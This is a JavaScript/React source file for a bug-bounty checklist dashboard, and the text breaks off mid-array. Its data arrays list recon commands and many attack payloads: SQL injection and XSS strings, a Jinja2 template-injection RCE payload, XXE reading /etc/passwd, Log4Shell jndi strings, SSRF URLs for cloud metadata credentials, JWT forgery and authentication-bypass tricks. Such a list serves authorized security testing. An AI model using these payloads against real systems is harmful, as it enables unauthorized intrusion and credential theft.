
import { useState, useCallback } from "react";

const T = {
  bg:"#060910",surf:"#0a0e16",card:"#0e141e",card2:"#121a24",
  border:"#182436",hi:"#1e2e44",
  g:"#00e5a0",gd:"#00e5a012",
  b:"#38bdf8",bd:"#38bdf812",
  o:"#fb923c",od:"#fb923c12",
  p:"#a78bfa",pd:"#a78bfa12",
  r:"#f87171",rd:"#f8717112",
  y:"#fbbf24",yd:"#fbbf2412",
  pk:"#f472b6",pkd:"#f472b612",
  cy:"#22d3ee",cyd:"#22d3ee12",
  lm:"#4ade80",lmd:"#4ade8012",
  wh:"#e2e8f0",
  text:"#c8d6eb",muted:"#5e7a99",dim:"#2a3d57",
};

const SEV = {
  Critical:{c:T.r,  b:"#f8717118"},
  High:    {c:T.o,  b:"#fb923c18"},
  Medium:  {c:T.y,  b:"#fbbf2418"},
  Low:     {c:T.b,  b:"#38bdf818"},
  Info:    {c:T.p,  b:"#a78bfa18"},
};

const css = `
@import url('https://fonts.googleapis.com/css2?family=IBM+Plex+Sans:wght@400;500;600;700&family=IBM+Plex+Mono:wght@400;500;600&display=swap');
*{box-sizing:border-box;margin:0;padding:0}
html,body{background:${T.bg};color:${T.text};font-family:'IBM Plex Sans',sans-serif;font-size:14px;overflow-x:hidden}
::-webkit-scrollbar{width:4px;height:4px}
::-webkit-scrollbar-track{background:${T.bg}}
::-webkit-scrollbar-thumb{background:${T.border};border-radius:2px}
::-webkit-scrollbar-thumb:hover{background:#2d4460}
.mono{font-family:'IBM Plex Mono',monospace}
.fi{animation:fi .25s ease}@keyframes fi{from{opacity:0;transform:translateY(6px)}to{opacity:1;transform:translateY(0)}}
.blink{animation:bl 1.4s step-end infinite}@keyframes bl{0%,100%{opacity:1}50%{opacity:0}}
.nav{cursor:pointer;padding:5px 10px;border-radius:5px;font-size:12px;transition:all .12s;display:flex;align-items:center;gap:7px;color:${T.muted};white-space:nowrap;border-left:2px solid transparent}
.nav:hover{background:#ffffff06;color:${T.text}}
.nav.on{background:${T.gd};color:${T.g};border-left-color:${T.g};padding-left:8px}
.tag{display:inline-flex;align-items:center;padding:1px 6px;border-radius:3px;font-size:10px;font-weight:600;letter-spacing:.3px;font-family:'IBM Plex Mono',monospace;white-space:nowrap}
.chip{display:inline-block;padding:2px 8px;border-radius:20px;font-size:10.5px;font-weight:500;white-space:nowrap}
.btn{cursor:pointer;border:none;font-family:'IBM Plex Sans',sans-serif;transition:all .15s}
.row:hover{background:#ffffff04}
.cmd{font-family:'IBM Plex Mono',monospace;font-size:11px;color:${T.g};background:${T.card2};border:1px solid ${T.border};border-radius:4px;padding:2px 6px}
.source-badge{font-size:9px;font-weight:700;padding:1px 5px;border-radius:3px;font-family:'IBM Plex Mono',monospace;letter-spacing:.5px}
`;

// ═══════════════════════════════════════
// DATA — BOUNTYBUDDY (recon.vulninsights.codes)
// ═══════════════════════════════════════
const BOUNTYBUDDY_RECON = [
  {cat:"Phase 1 · Passive Subdomain Enumeration", color:T.lm, src:"BountyBuddy", items:[
    {t:"subfinder -d target.com -all -recursive -o subfinder.txt  (ProjectDiscovery passive sources)",s:"Info"},
    {t:"amass enum -passive -norecursive -noalts -d target.com -o amass.txt",s:"Info"},
    {t:"assetfinder --subs-only target.com | tee assetfinder.txt",s:"Info"},
    {t:"OneForAll: python3 oneforall.py --target target.com run → largest source set",s:"Info"},
    {t:"crt.sh SQL: SELECT name_value FROM certificate_transparency WHERE name_value LIKE '%.target.com'",s:"Info"},
    {t:"Chaos dataset: chaos.projectdiscovery.io/dns/target → pre-collected program subdomains",s:"Info"},
    {t:"GitHub subdomain enum: github.com/search?q=%22.target.com%22+language:yaml&type=Code",s:"High"},
    {t:"Shodan: ssl:'target.com' 200 → subdomains from SSL certs indexed by Shodan",s:"Medium"},
    {t:"Security Trails API: query historical DNS records for target.com A/CNAME records",s:"Medium"},
    {t:"Bevigil OSINT: mobile app extracted endpoints including subdomains (bevigil.com)",s:"Medium"},
    {t:"Google: site:*.target.com -www -mail -blog → find interesting non-standard subdomains",s:"Medium"},
    {t:"RapidDNS: rapiddns.io/subdomain/target.com → quick passive lookup",s:"Info"},
    {t:"Merge + dedup: cat *.txt | sort -u | tee all-subs.txt → single clean list",s:"Info"},
  ]},
  {cat:"Phase 2 · Active Recon & Brute-Force", color:T.lm, src:"BountyBuddy", items:[
    {t:"puredns brute target.com -w best-dns-wordlist.txt --resolvers resolvers.txt",s:"Info"},
    {t:"dnsx -l all-subs.txt -resp -a -cname -o dns-resolved.txt",s:"Info"},
    {t:"Permutation: dnsgen all-subs.txt | dnsx -silent → new subs from permutation",s:"Medium"},
    {t:"altdns -i subs.txt -o data_output -w words.txt -r -s altdns_results.txt",s:"Medium"},
    {t:"ffuf -u https://FUZZ.target.com -w subdomains-top1million.txt -mc 200,301,302",s:"Info"},
    {t:"Recursive Amass: amass -passive -norecursive -noalts -df first-list.txt -o deeper.txt",s:"Info"},
    {t:"massdns -r resolvers.txt -t A -o S -w massdns.txt all-subs.txt → fast bulk resolution",s:"Info"},
    {t:"VHost brute: ffuf -w vhosts.txt -u https://TARGET_IP -H 'Host: FUZZ.target.com' -fw 1",s:"Medium"},
  ]},
  {cat:"Phase 3 · IP Mapping & ASN Recon", color:T.lm, src:"BountyBuddy", items:[
    {t:"ASN discovery: bgp.he.net → search company name → get AS number",s:"Info"},
    {t:"IP ranges from ASN: whois -h whois.radb.net -- '-i origin AS12345' | grep -Eo '([0-9.]+){4}/[0-9]+'",s:"Info"},
    {t:"Amass intel: amass intel -asn 12345 -o asn-domains.txt → all domains in ASN",s:"Info"},
    {t:"Reverse WHOIS: whoisxmlapi.com/reverse-whois-search → find all domains by registrant email/org",s:"Info"},
    {t:"PTR query: dnsx -ptr -l ip-list.txt -resp -o ptr-results.txt → reverse DNS on IP ranges",s:"Info"},
    {t:"Shodan ASN: org:'Company Name' → all exposed services in their AS",s:"Medium"},
    {t:"CIDR scan: nmap -sn 192.0.2.0/24 → ping sweep then port scan live hosts",s:"Info"},
    {t:"Port scan live hosts: rustscan -a ip-list.txt --range 1-65535 -- -sV",s:"Info"},
    {t:"asnlookup.com or bgp.tools → ASN to CIDR blocks lookup",s:"Info"},
    {t:"Acquisition discovery: crunchbase / LinkedIn → find acquired companies with own domains",s:"High"},
  ]},
  {cat:"Phase 4 · WAF / CDN Detection", color:T.lm, src:"BountyBuddy", items:[
    {t:"wafw00f https://target.com → identify WAF vendor (Cloudflare, Akamai, AWS WAF, etc.)",s:"Info"},
    {t:"nmap --script http-waf-fingerprint,http-waf-detect target.com",s:"Info"},
    {t:"CDN: check Cloudflare: dig target.com → IP in 104.x.x.x / 162.158.x.x range",s:"Info"},
    {t:"Origin IP behind CDN: censys.io search for historical A records / SecurityTrails",s:"High"},
    {t:"Origin IP: test direct /etc/hosts bypass by pointing target.com to found origin IP",s:"High"},
    {t:"Cloudflare bypass: check email headers for origin IP, SSL certs for real IP",s:"High"},
    {t:"Shodan: ssl.cert.subject.cn:target.com → find origin server behind CDN",s:"High"},
    {t:"Check X-Powered-By / Server headers for version info before WAF strips them",s:"Info"},
  ]},
  {cat:"Phase 5 · Staging & Dev Environment Discovery", color:T.lm, src:"BountyBuddy", items:[
    {t:"Wordlist fuzz for dev subdomains: dev. stage. staging. test. beta. uat. qa. sandbox. demo.",s:"High"},
    {t:"S3/cloud bucket: cloudbrute -d target.com -k target -t 80 → find cloud assets",s:"Critical"},
    {t:"GitHub search: org:target filename:.env → leaked staging env files with creds",s:"Critical"},
    {t:"Google: site:target.com inurl:staging | inurl:dev | inurl:test | inurl:uat",s:"High"},
    {t:"Shodan: 'staging.target.com' OR 'dev.target.com' → exposed dev servers",s:"High"},
    {t:"Check Netcraft for historical domain data → old staging/dev domains",s:"Medium"},
    {t:"Look for internal ports on live hosts: 8080 8443 3000 5000 9000 → dev servers",s:"High"},
  ]},
  {cat:"Phase 6 · API Endpoints & Admin Panels", color:T.lm, src:"BountyBuddy", items:[
    {t:"API: /api /api/v1 /api/v2 /graphql /graphiql /swagger.json /openapi.yaml /api-docs",s:"High"},
    {t:"Admin panels: /admin /administrator /manager /dashboard /console /control /backend",s:"High"},
    {t:"Spring Boot: /actuator /actuator/env /actuator/heapdump /actuator/mappings",s:"Critical"},
    {t:"PHP: /phpinfo.php /phpmyadmin /.env /config.php /info.php",s:"Critical"},
    {t:"Git: /.git/ → download and reconstruct source with git-dumper",s:"Critical"},
    {t:"Jenkins: /jenkins /hudson /jenkins/script → groovy script console RCE",s:"Critical"},
    {t:"Kubernetes: /api/v1/namespaces /metrics /healthz → exposed k8s API",s:"Critical"},
    {t:"Elasticsearch: :9200/_cat/indices → unauthenticated data access",s:"Critical"},
    {t:"gau target.com | grep -E '/admin|/api|/manager|/console' | sort -u",s:"High"},
    {t:"GoWitness screenshot all live hosts for visual admin panel triage",s:"Info"},
  ]},
];

// ═══════════════════════════════════════
// DATA — INFOSECWRITEUPS METHODOLOGY
// ═══════════════════════════════════════
const IWU_METHODOLOGY = [
  {cat:"InfoSecWriteUps · URL & JS Recon", color:T.cy, src:"InfoSecWriteUps", items:[
    {t:"gau target.com | uro | tee gau-urls.txt → All URLs from Wayback + commoncrawl",s:"Info"},
    {t:"waybackurls target.com | tee wayback.txt → historical URL harvest",s:"Info"},
    {t:"katana -u https://target.com -jc -d 5 -o katana.txt → JS-aware crawl depth 5",s:"Info"},
    {t:"hakrawler -url https://target.com -depth 3 -plain -insecure | tee hakrawler.txt",s:"Info"},
    {t:"cat allurls.txt | grep -E '\\.(json|env|log|zip|sql|bak|conf|yaml|key)$'",s:"Critical"},
    {t:"cat allurls.txt | sort -u | gf xss | tee xss-params.txt",s:"High"},
    {t:"cat allurls.txt | gf sqli | tee sqli-params.txt",s:"Critical"},
    {t:"cat allurls.txt | gf ssrf | tee ssrf-params.txt",s:"High"},
    {t:"cat allurls.txt | gf redirect | tee redirect-params.txt",s:"Medium"},
    {t:"cat allurls.txt | gf idor | tee idor-params.txt",s:"High"},
    {t:"linkfinder.py -i https://target.com -d -o linkfinder.html → extract JS endpoints",s:"High"},
    {t:"getJS --url https://target.com --complete → all JS files + extract content",s:"High"},
    {t:"JS secret scan: cat *.js | grep -iE 'api_key|secret|token|password|aws' | sort -u",s:"Critical"},
    {t:"Source map leak: curl https://target.com/app.js.map → full original TypeScript",s:"Critical"},
  ]},
  {cat:"InfoSecWriteUps · Live Host & Port Scanning", color:T.cy, src:"InfoSecWriteUps", items:[
    {t:"httpx -l all-subs.txt -status-code -title -tech-detect -threads 200 -o live.txt",s:"Info"},
    {t:"httpx -l all-subs.txt -ports 80,443,8080,8443,3000,5000,9000,9200 -o allports.txt",s:"Info"},
    {t:"massdns with A record type → rapid DNS resolution for large subdomain lists",s:"Info"},
    {t:"naabu -l live.txt -top-ports 1000 -o ports.txt → fast port discovery",s:"Info"},
    {t:"eyewitness --web -f live.txt -d screenshots/ → visual triage of all hosts",s:"Info"},
    {t:"gowitness file -f live.txt -P screenshots/ → full-page screenshot triage",s:"Info"},
    {t:"nuclei -l live.txt -t cves/ -t exposures/ -t misconfigurations/ -o nuclei.txt",s:"High"},
    {t:"nuclei -l live.txt -t technologies/ → identify tech stack for targeted attacks",s:"Info"},
    {t:"nuclei custom: write .yaml for target-specific checks (custom 403 bypass, etc.)",s:"High"},
  ]},
  {cat:"InfoSecWriteUps · Deep Vulnerability Patterns", color:T.cy, src:"InfoSecWriteUps", items:[
    {t:"IDOR in image upload: change user_id in multipart boundary → access other's images",s:"High"},
    {t:"XSS filter bypass: HTML entities, Unicode encoding, CSS expression, JS string breaks",s:"High"},
    {t:"Session hijack chain: XSS → steal auth code → OAuth Dirty Dancing → ATO ($15k Zoom)",s:"Critical"},
    {t:"WAF Frame-Up via XSS: trick WAF into flagging victim as malicious user (Zoom bounty)",s:"High"},
    {t:"SharePoint XXE CVE-2024-30043: low-priv user → file read + SSRF in SharePoint",s:"Critical"},
    {t:"Cypher injection: Neo4j graph DB injection via CYPHER query language ($2000 bounty)",s:"Critical"},
    {t:"Broken link hijacking: find 404 external links → register domain → own the page",s:"Medium"},
    {t:"OGNL injection: CVE-2017-5638 Struts2 → RCE via Content-Type header",s:"Critical"},
    {t:"Path traversal GitLab CVE-2023-2825: unauthenticated file read on 16.0.0",s:"Critical"},
    {t:"Citrix Bleed CVE-2023-4966: session token leak → unauthenticated access",s:"Critical"},
    {t:"SSRF via Referer header: Referer: http://internal.service/ triggers SSRF",s:"High"},
    {t:"SSRF via misconfigured Sentry tunnel: /api/tunnel proxies to internal network",s:"Critical"},
    {t:"Double compromise: unauthenticated SSRF + weaponized JS for full chain",s:"Critical"},
    {t:"Log poisoning: inject PHP code into log file → LFI to execute → RCE",s:"Critical"},
  ]},
  {cat:"InfoSecWriteUps · Manual Testing 5 Essentials", color:T.cy, src:"InfoSecWriteUps", items:[
    {t:"1. Login Flow: OTP rate limit, password reset vulns, ATO via XSS on login page",s:"Critical"},
    {t:"2. CSRF Validation: GET/POST methods, form submissions, CSRF token implementation",s:"High"},
    {t:"3. IDOR: create 2 accounts, test every ID/UUID for cross-user object access",s:"High"},
    {t:"4. Manual XSS: GET/POST based XSS, Param Miner for hidden params, DOM inspection",s:"High"},
    {t:"5. RBAC: if multi-role app, test privilege escalation across all roles",s:"Critical"},
    {t:"Param Miner Burp extension: discover hidden unlinked parameters causing cache poisoning",s:"High"},
    {t:"AuthMatrix Burp: map all user roles vs all endpoints in a matrix view",s:"High"},
    {t:"Autorize Burp: auto-test every request with another user's session automatically",s:"High"},
  ]},
];

// ═══════════════════════════════════════
// DATA — HACKER-WRITEUPS PATTERNS
// ═══════════════════════════════════════
const HACKER_WRITEUPS = [
  {cat:"Writeup Patterns · High-Value Bugs 2024–25", color:T.pk, src:"HackerWriteups+IWU", items:[
    {t:"IDOR → ATO: enumerate user IDs on export/profile endpoint → full account takeover",s:"Critical"},
    {t:"XSS on admin page without login: find unauthenticated error pages that reflect input",s:"High"},
    {t:"SQL injection on appointment check-in endpoint: blind SQLi in booking system",s:"Critical"},
    {t:"Stored XSS in account manager app via profile picture alt text / display name",s:"High"},
    {t:"IKEA-style SQLi: parameter in .es country-specific domain missed in WAF rules",s:"Critical"},
    {t:"NASA subdomain takeover: GitHub Pages CNAME → aiaa-dpw.larc.nasa.gov hijack",s:"High"},
    {t:"Unauthenticated XXE → arbitrary file read: common in SOAP endpoints, file parsers",s:"Critical"},
    {t:"Full org ATO by changing one parameter: role_id or org_id in account switch request",s:"Critical"},
    {t:"Glassdoor IDOR: retrieve email addresses of all users via public profile endpoint",s:"High"},
    {t:"ICS/SCADA: S7 protocol on port 102 → industrial system exposure via Shodan",s:"Critical"},
    {t:"Critical info disclosure chain: misconfigured headers → server path → credentials",s:"High"},
    {t:"$500 P5 informational bug: found via creative chaining to demonstrate real impact",s:"Low"},
    {t:"Real creds in archived data: Wayback Machine / Google cache stores old .env files",s:"Critical"},
    {t:"SSRF via Referer header: server fetches Referer URL for analytics → internal access",s:"High"},
  ]},
  {cat:"Writeup Patterns · Automation Workflow", color:T.pk, src:"HackerWriteups+Methodology", items:[
    {t:"Organize output: mkdir -p recon/{subs,ips,ports,urls,params,js,screenshots}",s:"Info"},
    {t:"Pipeline: subfinder | dnsx | httpx | waybackurls | gf patterns | nuclei",s:"Info"},
    {t:"subfinder -d target.com -o recon/subs/subfinder.txt",s:"Info"},
    {t:"httpx -l recon/subs/all.txt -o recon/live.txt",s:"Info"},
    {t:"cat recon/live.txt | waybackurls > recon/urls/wayback.txt",s:"Info"},
    {t:"dirsearch -u https://target.com -e php,html,js -o recon/dirs.txt",s:"Info"},
    {t:"python3 paramspider.py -d target.com -o recon/params/params.txt",s:"Info"},
    {t:"nuclei -l recon/live.txt -t cves/ -o recon/nuclei-cves.txt",s:"High"},
    {t:"gowitness file -f recon/live.txt -P recon/screenshots/ → visual triage",s:"Info"},
    {t:"Second Eye review: go back through findings looking for chains not single vulns",s:"High"},
    {t:"Track everything: Notion/Obsidian workspace → domain, endpoints, findings, status",s:"Info"},
    {t:"Monitor new assets: notify.sh + certstream alert when new cert issued for target",s:"Info"},
  ]},
  {cat:"Writeup Patterns · CVE Spraying & Old Bugs", color:T.pk, src:"DEFCON32+HackerWriteups", items:[
    {t:"CVE Spraying: nuclei -l targets.txt -t cves/ -tags critical,high → scan all CVEs",s:"High"},
    {t:"Find Struts2 apps: httpx with Content-Type: text/xml OGNL test header",s:"Critical"},
    {t:"Apache Log4j: ${jndi:ldap://} in ALL HTTP headers including X-Api-Version",s:"Critical"},
    {t:"Spring4Shell CVE-2022-22965: RCE via data binding on Tomcat + Spring MVC",s:"Critical"},
    {t:"GitLab RCE CVE-2021-22205: unauthenticated file upload → RCE via ExifTool",s:"Critical"},
    {t:"Confluence OGNL CVE-2022-26134: ${Class.forName('Runtime').exec('id')}",s:"Critical"},
    {t:"Fortinet SSL-VPN CVE-2023-27997: pre-auth heap overflow → RCE",s:"Critical"},
    {t:"MOVEit SQL injection CVE-2023-34362: unauthenticated SQLi → data exfil",s:"Critical"},
    {t:"Ivanti Connect Secure CVE-2024-21887: command injection in authenticated endpoint",s:"Critical"},
    {t:"PanOS CVE-2024-3400: unauthenticated RCE via GlobalProtect path traversal",s:"Critical"},
    {t:"Recon heavy approach: scan for outdated component versions → spray CVE templates",s:"High"},
    {t:"Tech fingerprint: httpx -l live.txt -tech-detect | grep 'Spring\\|Struts\\|Confluence'",s:"High"},
  ]},
];

// ═══════════════════════════════════════
// FROM V3 DATA (preserved + enriched)
// ═══════════════════════════════════════



const WEB_RECON = [
  {cat:"Passive Recon / OSINT", color:T.b, items:[
    {t:"subfinder -d target.com -all -recursive -o subs.txt",s:"Info"},
    {t:"amass enum -passive -d target.com -o amass.txt",s:"Info"},
    {t:"Certificate transparency: crt.sh SQL query for %.target.com",s:"Info"},
    {t:"Reverse WHOIS on registrant email/org for sibling domains (whoisxmlapi.com)",s:"Info"},
    {t:"ASN lookup: amass intel -org 'Company Name' → all netblocks",s:"Info"},
    {t:"cloud_enum -k target → S3/GCS/Azure blob discovery",s:"High"},
    {t:"Shodan: org:'Target Corp' ssl:'target.com' → exposed infrastructure",s:"Medium"},
    {t:"Censys: parsed.names: target.com → additional hosts/IPs",s:"Medium"},
    {t:"GitHub dorks: org:target language:yaml password filename:.env",s:"Critical"},
    {t:"Google dorks: site:target.com (ext:xml | ext:conf | ext:cnf | ext:reg)",s:"High"},
    {t:"Google dorks: site:target.com inurl:admin | inurl:login | inurl:panel",s:"Medium"},
    {t:"Favicon hash: shodan search http.favicon.hash:<hash>",s:"Medium"},
    {t:"Email harvest: theHarvester -d target.com -b all",s:"Info"},
    {t:"Wayback CDX API: web.archive.org/cdx/search/cdx?url=*.target.com/*",s:"Medium"},
    {t:"Bevigil: mobile apps contain hardcoded subdomains (bevigil.com)",s:"High"},
    {t:"trufflehog git/github --org=target --only-verified",s:"Critical"},
    {t:"gitleaks detect -r https://github.com/target/repo --report-path leaks.json",s:"Critical"},
    {t:"Postman public workspaces: search target name for leaked API collections",s:"High"},
  ]},
  {cat:"Active Recon & DNS Deep", color:T.b, items:[
    {t:"DNS brute: puredns brute target.com -w n0kovo-wordlist.txt --resolvers resolvers.txt",s:"Info"},
    {t:"dnsx -d target.com -w n0kovo-wordlist.txt -resp -a -cname -o dns.txt",s:"Info"},
    {t:"Permutation: dnsgen subs.txt | dnsx -silent → new subs from permutations",s:"Info"},
    {t:"altdns -i subs.txt -w words.txt -r -s altdns_results.txt",s:"Medium"},
    {t:"Zone transfer: dig axfr @ns1.target.com target.com",s:"High"},
    {t:"VHost brute: ffuf -w vhosts.txt -u https://IP -H 'Host: FUZZ.target.com'",s:"Medium"},
    {t:"Port scan: rustscan -a target.com --range 1-65535 -- -sV -sC",s:"Info"},
    {t:"naabu -l live.txt -top-ports 1000 -o ports.txt",s:"Info"},
  ]},
  {cat:"Content & Endpoint Discovery", color:T.b, items:[
    {t:"feroxbuster -u https://target.com -w raft-large-directories.txt -x php,aspx,jsp",s:"Info"},
    {t:"ffuf -w raft-large-directories.txt -u https://target.com/FUZZ -mc 200,301,302,403",s:"Info"},
    {t:"Param discovery: arjun -u https://target.com/endpoint --stable",s:"Medium"},
    {t:"paramspider -d target.com | uro | tee params.txt",s:"Medium"},
    {t:"JS analysis: katana -u https://target.com -jc -d 5 -o katana.txt",s:"High"},
    {t:"linkfinder.py -i https://target.com -d -o results.html",s:"High"},
    {t:"Source map: curl target.com/app.js.map → full original source code",s:"Critical"},
    {t:"Backup files: fuzz .bak .old ~ .orig .copy .swp extensions",s:"High"},
    {t:"API schema: /swagger.json /openapi.yaml /api-docs /redoc /graphql /graphiql",s:"Info"},
    {t:"robots.txt + sitemap.xml + /.well-known/ + security.txt",s:"Info"},
    {t:"403 bypass: //admin /./admin /%2e/admin X-Original-URL: /admin",s:"Medium"},
    {t:"wafw00f https://target.com → WAF identification + adjust payloads",s:"Info"},
    {t:"httpx -l urls.txt -tech-detect -title -status-code -content-length",s:"Info"},
  ]},
];

const WEB_INJECT = [
  {cat:"SQL Injection — All Types", color:T.r, items:[
    {t:"Error-based: ' → verbose SQL error leaks DB version/structure",s:"Critical"},
    {t:"Union-based: ' UNION SELECT NULL,NULL,NULL-- (column count via NULLs)",s:"Critical"},
    {t:"Boolean blind: AND 1=1-- vs AND 1=2-- → response diff",s:"Critical"},
    {t:"Time-based: '; IF(1=1) WAITFOR DELAY '0:0:5'-- (MSSQL) / SLEEP(5) MySQL",s:"Critical"},
    {t:"OOB SQLi: LOAD_FILE UNC path → DNS callback via interactsh",s:"Critical"},
    {t:"Second-order: stored payload executed in different context",s:"Critical"},
    {t:"sqlmap -r request.txt --level 5 --risk 3 --batch --dbs",s:"Critical"},
    {t:"sqlmap --tamper=space2comment,between,randomcase → WAF bypass",s:"Critical"},
    {t:"NoSQL: {\"$gt\":\"\"}, {\"$ne\":null}, {\"$regex\":\".*\"}, {\"$where\":\"...\"}",s:"High"},
    {t:"GraphQL SQLi: searchTransactions(filter: \"x' OR 1=1--\") verbose error",s:"High"},
    {t:"SQLi in all headers: User-Agent, X-Forwarded-For, Referer, Cookie values",s:"High"},
    {t:"IKEA-style: country-specific domain (.es/.de) may bypass main WAF",s:"Critical"},
    {t:"Appointment/booking endpoints: date/time params often unsanitized",s:"Critical"},
  ]},
  {cat:"XSS — Complete Testing", color:T.r, items:[
    {t:"Reflected: all GET/POST params, headers (User-Agent, Referer, X-Forwarded-For)",s:"High"},
    {t:"Stored: bio, name, address, comment, ticket, review, support fields",s:"High"},
    {t:"DOM XSS sources: location.hash, location.search, document.referrer, window.name",s:"High"},
    {t:"DOM XSS sinks: innerHTML, outerHTML, eval(), setTimeout(), document.write()",s:"High"},
    {t:"dalfox url 'https://t.com/page?q=FUZZ' --deep-domxss --mining-dom",s:"High"},
    {t:"XSS in file upload: .html .svg files with <script> tags",s:"High"},
    {t:"CSP bypass: unsafe-inline, * wildcard, trusted CDN JSONP endpoints",s:"High"},
    {t:"mXSS: <noscript><p title=\"</noscript><img src=x onerror=alert(1)>\">",s:"High"},
    {t:"Blind XSS: xsshunter payload in admin-visible fields (name, ticket, addr)",s:"High"},
    {t:"XSS filter bypass: HTML entities, Unicode \\u003cscript\\u003e, JS string breaks",s:"High"},
    {t:"Polyglot: jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert())//%0D%0A",s:"High"},
    {t:"XSS in PDF generators: <img src=x onerror=document.write(document.cookie)>",s:"High"},
    {t:"XSS in markdown: [a](javascript:alert(1))",s:"Medium"},
    {t:"Angular SSTI as XSS: {{constructor.constructor('alert(1)')()}}",s:"High"},
    {t:"WAF Frame-Up: use XSS to get WAF to ban the victim (from Zoom $15k writeup)",s:"Medium"},
  ]},
  {cat:"Other Injections", color:T.r, items:[
    {t:"SSTI: {{7*7}} ${7*7} #{7*7} <%=7*7%> → identify template engine",s:"Critical"},
    {t:"Jinja2 RCE: {{config.__class__.__init__.__globals__['os'].popen('id').read()}}",s:"Critical"},
    {t:"XXE: <!DOCTYPE x [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><x>&xxe;</x>",s:"High"},
    {t:"XXE OOB: SYSTEM 'http://interactsh.com' for blind detection",s:"High"},
    {t:"XXE via SVG/DOCX/XLSX file upload",s:"High"},
    {t:"SharePoint XXE CVE-2024-30043: low-priv user → file read + SSRF",s:"Critical"},
    {t:"LDAP injection: *)(uid=*))(|(uid=* in search/login fields",s:"High"},
    {t:"Cypher injection: ' OR 1=1 in Neo4j graph DB queries ($2000 bounty)",s:"Critical"},
    {t:"Command injection: ; id && id || id `id` $(id) in ALL inputs",s:"Critical"},
    {t:"CRLF: %0d%0aContent-Type:text/html%0d%0a → header injection",s:"Medium"},
    {t:"Log4Shell: ${jndi:ldap://interactsh.com/x} in all headers",s:"Critical"},
    {t:"OGNL injection CVE-2017-5638: Content-Type header → Struts2 RCE",s:"Critical"},
    {t:"Log poisoning: inject PHP into access log → LFI to execute → RCE",s:"Critical"},
  ]},
];

const WEB_AUTH = [
  {cat:"Authentication Bypass", color:T.y, items:[
    {t:"Default creds: admin/admin, admin/password, test/test on ALL panels",s:"Critical"},
    {t:"Response manipulation: false→true, 403→200, Invalid→Valid",s:"Critical"},
    {t:"Skip step: POST /step2 without completing step 1",s:"High"},
    {t:"Parameter pollution: username=legit&username=admin",s:"High"},
    {t:"Type juggling PHP: username[]=admin (array vs string loose ==)",s:"Critical"},
    {t:"SQL in username: admin'-- / ' OR '1'='1",s:"Critical"},
    {t:"JSON type confusion: {\"password\":true} vs {\"password\":\"secret\"}",s:"High"},
    {t:"Unicode normalization bypass: ℕ→N can bypass uniqueness checks",s:"High"},
    {t:"Email: admin+anything@target.com creates duplicate accounts",s:"High"},
    {t:"Case sensitivity: Admin vs admin may map to different records",s:"Medium"},
  ]},
  {cat:"JWT Deep Testing", color:T.y, items:[
    {t:"Algorithm none: change alg to 'none'/'NONE'/'None', remove signature",s:"Critical"},
    {t:"RS256→HS256 confusion: sign with RSA public key as HMAC secret",s:"Critical"},
    {t:"Weak secret: hashcat -a 0 -m 16500 token.txt rockyou.txt",s:"Critical"},
    {t:"kid path traversal: {\"kid\":\"../../dev/null\"} → sign with empty string",s:"Critical"},
    {t:"kid SQL injection: {\"kid\":\"a' UNION SELECT 'secret'--\"}",s:"Critical"},
    {t:"jku/x5u injection: point to attacker's JWKS endpoint",s:"Critical"},
    {t:"Embedded JWK: add attacker-controlled public key in header",s:"Critical"},
    {t:"Claim manipulation: 'role':'user'→'admin', 'admin':false→true",s:"Critical"},
  ]},
  {cat:"OAuth / MFA / Password Reset", color:T.y, items:[
    {t:"CSRF on OAuth: state parameter missing or predictable",s:"High"},
    {t:"redirect_uri bypass: path traversal, @attacker.com, %0d%0a",s:"Critical"},
    {t:"PKCE bypass: swap code_challenge with your own verifier",s:"High"},
    {t:"SAML signature wrapping: copy signed assertion, inject malicious unsigned",s:"Critical"},
    {t:"MFA null/blank code: send empty {\"code\":null} or \"\"",s:"Critical"},
    {t:"MFA response manipulation: 'success':false → true",s:"Critical"},
    {t:"OTP brute-force: 6-digit = 1M combinations, test rate limit",s:"Critical"},
    {t:"Password reset host header injection: → attacker.com link in email",s:"High"},
    {t:"Password reset token reuse: same token valid multiple times",s:"High"},
    {t:"Password reset poisoning: X-Forwarded-Host override",s:"High"},
    {t:"Session hijack chain: XSS → steal auth code → OAuth Dirty Dancing → ATO",s:"Critical"},
  ]},
];

const WEB_ACCESS = [
  {cat:"IDOR Exhaustive", color:T.o, items:[
    {t:"Numeric ID: /api/users/1001 → /api/users/1000",s:"High"},
    {t:"UUID: test for v1 (timestamp-based, predictable)",s:"High"},
    {t:"IDOR in download/export: /api/export?report_id=123 → 122",s:"High"},
    {t:"IDOR in file paths: /files/user_1001_photo.jpg → 1000",s:"High"},
    {t:"IDOR in websocket messages: change user_id in ws payload",s:"High"},
    {t:"IDOR in bulk ops: bulk delete IDs array with other users",s:"High"},
    {t:"Glassdoor-style IDOR: public endpoint leaks all user emails",s:"High"},
    {t:"Autorize Burp extension: auto-test every request with lower-priv auth",s:"High"},
  ]},
  {cat:"Privilege Escalation & Logic", color:T.o, items:[
    {t:"Mass assignment: add isAdmin/role/permissions/plan to POST body",s:"Critical"},
    {t:"Full org ATO: change role_id or org_id in account switch → admin",s:"Critical"},
    {t:"Forced browsing: /admin/users without valid auth token",s:"High"},
    {t:"X-Original-URL: /admin on GET / → backend routing bypass",s:"High"},
    {t:"Negative values: quantity=-1, amount=-100 → credit account",s:"Critical"},
    {t:"Zero price: price=0.00, price=0, price=null in checkout",s:"Critical"},
    {t:"Integer overflow: MAX_INT + 1 wraps negative",s:"High"},
    {t:"Race condition coupon stacking: same coupon multiple times",s:"High"},
    {t:"Order state manipulation: status='pending'→'completed'",s:"Critical"},
    {t:"Skip payment step: jump from cart directly to order confirmed",s:"Critical"},
  ]},
];

const WEB_ADVANCED = [
  {cat:"SSRF Full Spectrum", color:T.p, items:[
    {t:"AWS IMDSv1: http://169.254.169.254/latest/meta-data/iam/security-credentials/",s:"Critical"},
    {t:"GCP metadata: http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",s:"Critical"},
    {t:"Azure IMDS: http://169.254.169.254/metadata/identity/oauth2/token",s:"Critical"},
    {t:"Gopher→Redis RCE: gopher://127.0.0.1:6379/_PING write SSH key",s:"Critical"},
    {t:"Blind SSRF: interactsh.com in ALL URL-accepting params",s:"High"},
    {t:"SSRF via redirect: 302 to 169.254.169.254",s:"High"},
    {t:"URL bypass: http://127.1/ http://0.0.0.0/ http://localhost./ ",s:"High"},
    {t:"SSRF via Referer: Referer: http://internal.service/ → server fetches for analytics",s:"High"},
